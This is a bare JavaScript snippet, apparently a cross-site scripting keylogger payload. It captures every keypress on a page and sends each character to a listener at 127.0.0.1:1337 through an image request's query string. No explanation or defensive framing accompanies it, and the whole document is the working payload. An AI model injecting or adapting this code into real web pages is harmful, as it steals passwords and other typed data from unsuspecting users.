document.onkeypress = function Logged(inp) {

    keypressed = String.fromCharCode(inp.which);

    new Image().src = "http://127.0.0.1:1337/?"+keypressed;
}
